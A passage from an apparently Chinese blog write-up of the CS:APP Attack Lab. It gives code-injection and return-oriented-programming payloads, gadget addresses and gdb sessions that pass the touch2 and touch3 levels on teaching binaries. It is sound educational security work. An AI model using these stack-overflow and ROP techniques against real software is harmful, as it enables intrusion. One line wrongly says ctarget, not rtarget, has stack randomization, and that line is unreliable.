touch2.o &gt;touch2.d</span><br></pre></td></tr></table></figure><br>输出的touch2.d如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">touch2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:48 c7 c7 fa 97 b9 59 mov    $0x59b997fa,%rdi</span><br><span class="line">   7:68 ec 17 40 00       push   $0x4017ec</span><br><span class="line">   c:c3                   ret    </span><br></pre></td></tr></table></figure></p><p>由于我们要将指令放到栈顶，故这一串十六进制数对应的字符串应该最先输入，然后在40个字符之后，跟touch1同理地输入栈顶的位置，构造touch2.txt如下：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68     /* code to be injeceted */</span><br><span class="line">ec 17 40 00 c3 00 00 00    </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00     /* jump to code injected to buffer */</span><br></pre></td></tr></table></figure></p><p>一顿操作转成字符串输入到ctarget中：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# objdump -d touch2.o &gt;touch2.d</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./hex2raw &lt;touch2.txt &gt;t2raw.txt</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./ctarget -q -i t2raw.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><br>看到Touch2!: You called touch2(0x59b997fa)说明通过了测试，好耶</p><h2 id="3-touch3"><a href="#3-touch3" class="headerlink" title="3. touch3"></a>3. touch3</h2><h3 id="3-1-解题思路"><a href="#3-1-解题思路" class="headerlink" title="3.1 解题思路"></a>3.1 解题思路</h3><p>从实验文档可知，第三个关卡要求我们跳转到touch3时，传入一个char类型的指针，该指针指向的字符串与cookie的十六进制相同。<br>例如：cookie的值为0x12345678时，指针char * p指向的字符串应该为”12345678”</p><p>因此，我们需要：</p><ol><li>在输入中包含cookie对应的十六进制值的字符串，并且根据栈顶位置计算它的地址</li><li>仿照touch2将传入的%edi修改为字符串的地址</li></ol><p>获取touch3地址<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas touch3</span><br><span class="line">Dump of assembler code for function touch3:</span><br><span class="line">   0x00000000004018fa &lt;+0&gt;:     push   %rbx</span><br></pre></td></tr></table></figure><br>得到<strong>touch3的地址为0x4018fa</strong></p><h3 id="3-2-解题过程"><a href="#3-2-解题过程" class="headerlink" title="3.2 解题过程"></a>3.2 解题过程</h3><p>从touch2中，我们知道在getbuf中，缓冲区开始的位置为$rsp = 0x5561dx78，存放返回地址的位置为0x5561dx78 + 0x28 = 0x5561dxa0</p><p>同touch2，我们在缓冲区开始的位置编写指令，然后在返回地址的位置跳转到我们编写的指令。</p><p>当然，其中还有许多空位，我们不妨利用这些空位放cookie对应的字符串，如下：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 88 dc 61 55 68     /* code to be injeceted */   </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61     /* 0x5561dc78 + 2*0x8 = 0x5561dc88 */   </span><br><span class="line">00 00 00 00 00 00 00 00     </span><br><span class="line">00 00 00 00 00 00 00 00    </span><br><span class="line">78 dc 61 55 00 00 00 00     /* jump to code injected to buffer */</span><br></pre></td></tr></table></figure><br>第一二行中，48 c7 c7 88 dc 61 55就是mov $0x5561dc88, %rdi，将字符串的地址传给第一个参数</p><p>68 fa 18 40 00 是push $0x4018fa，表示将touch3的地址压栈</p><p>c3则是ret，从栈中弹出一个地址进行跳转</p><p>第三行的35 39 62 39 39 37 66 61对应cookie = 0x59b997fa，35是5的ASCII码，39是9的ASCII码…</p><p>来试试：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./hex2raw &lt;touch3.txt &gt;t3raw.txt</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# gdb ctarget</span><br><span class="line">(gdb) b touch3</span><br><span class="line">Breakpoint 1 at 0x4018fa: file visible.c, line 71.</span><br><span class="line">(gdb) run -q -i t3raw.txt</span><br><span class="line">Starting program: /mnt/d/.c/csapp/target1/ctarget -q -i t3raw.txt</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, touch3 (sval=0x5561dca8 &quot;59b997fa&quot;) at visible.c:71</span><br><span class="line">71      visible.c: No such file or directory.</span><br><span class="line">(gdb) x/s $rdi</span><br><span class="line">0x5561dca8:     &quot;59b997fa&quot;</span><br></pre></td></tr></table></figure><br>一直走到touch3里面都很好，继续：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Misfire: You called touch3(&quot;�_hU&quot;)</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:FAIL:0xffffffff:ctarget:3:48 C7 C7 88 DC 61 55 68 FA 18 40 00 C3 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br><span class="line">[Inferior 1 (process 656506) exited normally]</span><br></pre></td></tr></table></figure><br>为啥直接跳过，显示我们传入的字符串是一串乱码？</p><p>其实是因为touch3中调用的hexmatch，为了保存callee-saved registers，做了几个<strong>压栈操作把我们的字符串覆盖</strong>了，导致传入touch3的指针读到的字符串变成一串乱码：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas hexmatch</span><br><span class="line">Dump of assembler code for function hexmatch:</span><br><span class="line">   0x000000000040184c &lt;+0&gt;:     push   %r12</span><br><span class="line">   0x000000000040184e &lt;+2&gt;:     push   %rbp</span><br><span class="line">   0x000000000040184f &lt;+3&gt;:     push   %rbx</span><br></pre></td></tr></table></figure></p><p>验证一下这个猜想：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b hexmatch</span><br><span class="line">Breakpoint 1 at 0x40184c: file visible.c, line 62.</span><br><span class="line">(gdb) run -q -i t3raw.txt</span><br><span class="line">Starting program: /mnt/d/.c/csapp/target1/ctarget -q -i t3raw.txt</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, hexmatch (val=1505335290, sval=sval@entry=0x5561dc88 &quot;59b997fa&quot;) at visible.c:62</span><br><span class="line">62      visible.c: No such file or directory.</span><br><span class="line">(gdb) x/s $rsi</span><br><span class="line">0x5561dc88:     &quot;59b997fa&quot;</span><br><span class="line">(gdb) stepi</span><br><span class="line">0x000000000040184e      62      in visible.c</span><br><span class="line">(gdb)</span><br><span class="line">0x000000000040184f      62      in visible.c</span><br><span class="line">(gdb) x/s $rsi</span><br><span class="line">0x5561dc88:     &quot;\350_hU&quot;</span><br></pre></td></tr></table></figure><br>果然如此，在进入hexmatch的时候，指针指向的字符串还是我们需要的值，经过两步后就变成乱码了。</p><p>因此，我们需要将字符串移动到不被hexmatch中操作影响的位置，如下：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68     /* code to be injeceted */   </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00     </span><br><span class="line">00 00 00 00 00 00 00 00     </span><br><span class="line">00 00 00 00 00 00 00 00    </span><br><span class="line">78 dc 61 55 00 00 00 00     /* jump to code injected to buffer */</span><br><span class="line">35 39 62 39 39 37 66 61     /* 0x5561dc78 + 6*0x8 = 0x5561dca8 */   </span><br><span class="line">00</span><br></pre></td></tr></table></figure><br>特地加个00表示终止字符’\0’</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./hex2raw &lt;touch3.txt &gt;t3raw.txt</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./ctarget -q -i t3raw.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>看到Touch3!: You called touch3(“59b997fa”)说明通过测试，好耶！</p><h1 id="二、面向返回编程-Return-Oriented-Programming-or-ROP"><a href="#二、面向返回编程-Return-Oriented-Programming-or-ROP" class="headerlink" title="二、面向返回编程(Return-Oriented Programming, or ROP)"></a>二、面向返回编程(Return-Oriented Programming, or ROP)</h1><h2 id="1-touch2"><a href="#1-touch2" class="headerlink" title="1. touch2"></a>1. touch2</h2><h3 id="1-1-解题思路-1"><a href="#1-1-解题思路-1" class="headerlink" title="1.1 解题思路"></a>1.1 解题思路</h3><p>实验文档中指明了我们不能使用code injections但是能用ROP攻击rtarget，在rtarget中有一系列函数，与farm.c中相同，用于提供gadget，并且附表提供了movq，movl，popq等指令的十六进制码，如下：</p><p><img src="/img/2024/02/figure3.png" alt="image.png"></p><p>该阶段要求我们使用ROP通过touch2的测试，因此，我们需要：</p><ol><li>在farm.c找到能将cookie的值保存到%rdi的gadget</li><li>在rtarget找到gadget的地址，翻译为字符串后输入到程序中</li></ol><h3 id="1-2-解题过程-1"><a href="#1-2-解题过程-1" class="headerlink" title="1.2 解题过程"></a>1.2 解题过程</h3><p>先把farm.c的函数都变成能看到十六进制码的汇编<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# gcc -c farm.c</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# objdump -d farm.o &gt;farm.d</span><br></pre></td></tr></table></figure></p><p>既然文档给了mov和pop，我们就用pop把cookie的值传给%rdi： popq %rdi<br>查表看看popq %rdi对应的十六进制码为：5f<br>在farm.d中使用ctrl+f输入5f找不到一条带有5f的，放弃这个思路</p><p>既然没办法直接pop到%rdi，那我mov还不行吗，查表看所有能mov到%rdi的指令，ctrl+f输入48 89 c7, 48 89 cf, …发现只有<strong>movq %rax %rdi : 48 89 c7</strong>找得到两个：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0000000000000048 &lt;setval_237&gt;:</span><br><span class="line">  48:f3 0f 1e fa          endbr64 </span><br><span class="line">  4c:55                   push   %rbp</span><br><span class="line">  4d:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  50:48 89 7d f8          mov    %rdi,-0x8(%rbp)</span><br><span class="line">  54:48 8b 45 f8          mov    -0x8(%rbp),%rax</span><br><span class="line">  58:c7 00 48 89 c7 c7    movl   $0xc7c78948,(%rax)</span><br><span class="line">  5e:90                   nop</span><br><span class="line">  5f:5d                   pop    %rbp</span><br><span class="line">  60:c3                   ret </span><br><span class="line">0000000000000093 &lt;setval_426&gt;:</span><br><span class="line">  93:f3 0f 1e fa          endbr64 </span><br><span class="line">  97:55                   push   %rbp</span><br><span class="line">  98:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  9b:48 89 7d f8          mov    %rdi,-0x8(%rbp)</span><br><span class="line">  9f:48 8b 45 f8          mov    -0x8(%rbp),%rax</span><br><span class="line">  a3:c7 00 48 89 c7 90    movl   $0x90c78948,(%rax)</span><br><span class="line">  a9:90                   nop</span><br><span class="line">  aa:5d                   pop    %rbp</span><br><span class="line">  ab:c3                   ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>我选择<strong>setval_426</strong>，因为它在48 89 c7后是90，90是nop，可以没有副作用地占用一条指令</p><p>既然要通过%rax把值传给%rdi，那么就得把值pop到%rax，查表得<strong>popq %rax</strong>：58<br>在farm.d中找到带有58的指令如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000000000ac &lt;getval_280&gt;:</span><br><span class="line">  ac:f3 0f 1e fa          endbr64 </span><br><span class="line">  b0:55                   push   %rbp</span><br><span class="line">  b1:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  b4:b8 29 58 90 c3       mov    $0xc3905829,%eax</span><br><span class="line">  b9:5d                   pop    %rbp</span><br><span class="line">  ba:c3 </span><br></pre></td></tr></table></figure><br>在<strong>getval_280</strong>的b4那一行有58 90 c3，58是popq %rax，90是nop，c3是ret，正好满足了我们的需求</p><p>接下来在rtarget中找到这两句的位置：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas setval_426</span><br><span class="line">Dump of assembler code for function setval_426:</span><br><span class="line">   0x00000000004019c3 &lt;+0&gt;:     movl   $0x90c78948,(%rdi)</span><br><span class="line">   0x00000000004019c9 &lt;+6&gt;:     ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas getval_280</span><br><span class="line">Dump of assembler code for function getval_280:</span><br><span class="line">   0x00000000004019ca &lt;+0&gt;:     mov    $0xc3905829,%eax</span><br><span class="line">   0x00000000004019cf &lt;+5&gt;:     ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><br>可以看出，rtarget在gdb中的汇编比farm.d中的更简单，但是关键句还在那里，得到两个gadget为：<br><strong>popq %rax：0x4019cc</strong><br><strong>movq %rax, %rdi：0x4019c5</strong></p><p>构造输入的字符串编码如下：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00     </span><br><span class="line">00 00 00 00 00 00 00 00     </span><br><span class="line">00 00 00 00 00 00 00 00     </span><br><span class="line">00 00 00 00 00 00 00 00     </span><br><span class="line">00 00 00 00 00 00 00 00     /* 前面四十个字符没有用 */</span><br><span class="line">cc 19 40 00 00 00 00 00     /* popq %rax */</span><br><span class="line">fa 97 b9 59 00 00 00 00     /* cookie的值：0x59b997fa */</span><br><span class="line">c5 19 40 00 00 00 00 00     /* movq %rax, %rdi */</span><br><span class="line">ec 17 40 00 00 00 00 00     /* jump to touch2 */</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./hex2raw &lt;rop1.txt &gt;rop_1.txt</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./rtarget -q -i rop_1.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>爽！</p><h2 id="2-touch3"><a href="#2-touch3" class="headerlink" title="2. touch3"></a>2. touch3</h2><h3 id="2-1-解题思路-1"><a href="#2-1-解题思路-1" class="headerlink" title="2.1 解题思路"></a>2.1 解题思路</h3><p>rtarget不同于ctarget，ctarget有栈随机化，我们没办法在gdb中得到栈顶的位置，然后计算确定我们字符串的地址。</p><p>但是我们可以直接用%rsp啊！只要<strong>movq %rsp, %rdi</strong>，就能把当时栈顶的地址给到了%rdi。然后再给%rdi加一个<strong>偏移量</strong>，就能使%rdi指向栈里边的任一位置了</p><h3 id="2-2-解题过程-1"><a href="#2-2-解题过程-1" class="headerlink" title="2.2 解题过程"></a>2.2 解题过程</h3><h4 id="1-获取栈顶地址"><a href="#1-获取栈顶地址" class="headerlink" title="(1) 获取栈顶地址"></a>(1) 获取栈顶地址</h4><p>别忘了在touch2里面，要mov到rdi只有movq %rax, %rdi才有对应的gadget，既然%rax守得那么严，那就试试先<strong>movq %rsp, %rax</strong>，再movq %rax, %rdi，查表可知<br>movq %rsp, %rax ：<strong>48 89 e0</strong><br>在farm.d中找到了合适的函数如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0000000000000360 &lt;setval_350&gt;:</span><br><span class="line"> 360:f3 0f 1e fa          endbr64 </span><br><span class="line"> 364:55                   push   %rbp</span><br><span class="line"> 365:48 89 e5             mov    %rsp,%rbp</span><br><span class="line"> 368:48 89 7d f8          mov    %rdi,-0x8(%rbp)</span><br><span class="line"> 36c:48 8b 45 f8          mov    -0x8(%rbp),%rax</span><br><span class="line"> 370:c7 00 48 89 e0 90    movl   $0x90e08948,(%rax)</span><br><span class="line"> 376:90                   nop</span><br><span class="line"> 377:5d                   pop    %rbp</span><br><span class="line"> 378:c3                   ret    </span><br></pre></td></tr></table></figure></p><p>在gdb中找到<strong>setval_350</strong>的地址：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas setval_350</span><br><span class="line">Dump of assembler code for function setval_350:</span><br><span class="line">   0x0000000000401aab &lt;+0&gt;:     movl   $0x90e08948,(%rdi)</span><br><span class="line">   0x0000000000401ab1 &lt;+6&gt;:     ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><br>因此，以下编码能执行<strong>movq %rsp, %rax</strong>以及<strong>movq %rax, %rdi</strong>两个操作：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ad 1a 40 00 00 00 00 00     /* movq %rsp, %rax */</span><br><span class="line">c5 19 40 00 00 00 00 00     /* movq %rax, %rdi */</span><br></pre></td></tr></table></figure></p><h4 id="2-添加偏移量"><a href="#2-添加偏移量" class="headerlink" title="(2) 添加偏移量"></a>(2) 添加偏移量</h4><p>计算偏移量的话免不了lea，但是再farm.d里面ctrl+f找不到lea指令。于是又试着：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d rtarget &gt;rtarget.d</span><br></pre></td></tr></table></figure><br>得到的结果居然非常简洁易看，早知道一开始就用这个了</p><p>而且rtarget.d中能够找到不少lea指令，其中一个长这样：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   ret    </span><br></pre></td></tr></table></figure><br>有了这个函数，我们只要把偏移量pop到%rsi，就能把字符串的地址赋给%rax，最终再转移到%rdi</p><p>这里就能看到<strong>add_xy</strong>的地址为<strong>0x4019d6</strong></p><p>但是很遗憾，没有gadget能够帮我们把值pop到%rsi，而且只有%rcx能够把值mov到%rsi<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:8d 87 89 ce 90 90    lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:c3                   ret    </span><br></pre></td></tr></table></figure><br>这里89 ce就是<strong>movl %ecx, %esi ，地址为0x401a13</strong></p><p>真是服了，这下又得看该怎么把值弄到%rcx，结果就是只有%rdx能够把值mov到%rcx<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:b8 89 d1 38 c9       mov    $0xc938d189,%eax</span><br><span class="line">  401a38:c3                   ret    </span><br></pre></td></tr></table></figure><br>这里89 d1就是<strong>movl %edx, %ecx，地址为0x401a34</strong>，%rcx，38 c9是cmpb %cl, %cl不会影响值</p><p>看看怎么把值搞到%rdx，太好了，能从栈上pop到值得%rax能把值mov到%rdx<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:b8 5c 89 c2 90       mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:c3                   ret    </span><br></pre></td></tr></table></figure><br>这里的89 c2 90就是<strong>movl %eax, %edx，地址为0x4019dd</strong></p><p>综上，为了让%rdi加上这个偏移量，需要以下步骤：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cc 19 40 00 00 00 00 00     /* popq %rax */</span><br><span class="line">xx 00 00 00 00 00 00 00     /* 偏移量 */</span><br><span class="line">dd 19 40 00 00 00 00 00     /* movl %eax, %edx */</span><br><span class="line">34 1a 40 00 00 00 00 00     /* movl %edx, %ecx */</span><br><span class="line">13 1a 40 00 00 00 00 00     /* movl %ecx, %esi */</span><br><span class="line">d6 19 40 00 00 00 00 00     /* lea (%rdi, %rsi, 1), %rdi */</span><br></pre></td></tr></table></figure></p><h4 id="3-完整结果"><a href="#3-完整结果" class="headerlink" title="(3) 完整结果"></a>(3) 完整结果</h4><p>将上述两串编码组合起来，如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00     </span><br><span class="line">00 00 00 00 00 00 00 00     </span><br><span class="line">00 00 00 00 00 00 00 00     </span><br><span class="line">00 00 00 00 00 00 00 00     /* 前面四十个字符没有用 */</span><br><span class="line">ad 1a 40 00 00 00 00 00     /* movq %rsp, %rax */</span><br><span class="line">c5 19 40 00 00 00 00 00     /* movq %rax, %rdi          &lt;-- 赋给%rdi的%rsp指向这里 */  </span><br><span class="line">cc 19 40 00 00 00 00 00     /* popq %rax */</span><br><span class="line">48 00 00 00 00 00 00 00     /* 偏移量 */</span><br><span class="line">dd 19 40 00 00 00 00 00     /* movl %eax, %edx */</span><br><span class="line">34 1a 40 00 00 00 00 00     /* movl %edx, %ecx */</span><br><span class="line">13 1a 40 00 00 00 00 00     /* movl %ecx, %esi              至此偏移量保存在%rsi */        </span><br><span class="line">d6 19 40 00 00 00 00 00     /* lea (%rdi, %rsi, 1), %rax */</span><br><span class="line">c5 19 40 00 00 00 00 00     /* movq %rax, %rdi */</span><br><span class="line">fa 18 40 00 00 00 00 00     /* jump to touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61     /* cookie的十六进制         &lt;-- 这里比上一个箭头多9行，故偏移量为9*0x8 = 0x48 */ </span><br><span class="line">00</span><br></pre></td></tr></table></figure><br><strong>注释符号跟文字之间一定要留间隔</strong>啊！！！！！找了一百年的bug</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./hex2raw &lt;rop2.txt &gt;rop_2.txt</span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/target1# ./rtarget -q -i rop_2.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called 